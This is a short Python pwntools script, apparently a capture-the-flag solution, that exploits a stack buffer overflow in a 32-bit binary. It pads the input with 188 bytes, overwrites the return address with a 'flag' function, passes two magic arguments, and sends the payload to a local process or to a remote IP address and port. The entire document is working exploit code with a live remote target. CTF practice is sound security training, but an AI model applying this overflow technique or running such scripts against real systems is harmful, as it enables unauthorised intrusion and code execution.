#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("83.136.249.57", 31917)

    return r


def main():
    r = conn()

    payload = b"A" * 188 + p32(exe.symbols["flag"]) + p32(exe.plt["exit"]) + p32(0xdeadbeef) + p32(0xc0ded00d)
    
    r.sendlineafter(b"0xDiablos: ", payload)
    log.success(f"Flag obtained: {r.recvlinesS(3)[-1]}")


if __name__ == "__main__":
    main()
